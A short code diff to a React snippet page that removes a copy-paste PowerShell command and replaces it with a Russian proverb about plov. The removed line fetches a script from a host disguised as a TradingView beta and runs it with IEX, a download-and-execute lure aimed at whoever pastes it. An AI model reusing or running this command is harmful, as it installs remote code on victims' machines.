@@ -232,7 +232,7 @@ function HomePage() {
 function SnippetPage() {
   const { snippetId } = useParams();
   const [copied, setCopied] = useState(false);
-  const code = `cmd /k powershell -Command "$app='TradingView'; $update='beta'+$app+'.app'; $Response=Invoke-WebRequest -Uri $update -UseBasicParsing -UserAgent $app; $Script=[System.Text.Encoding]::UTF8.GetString($Response.Content); IEX $Script"`;
+  const code = `«Бедный человек ест плов, богатый человек ест только плов»`;
 
   function getLineNumbers() {
     let arr = [];
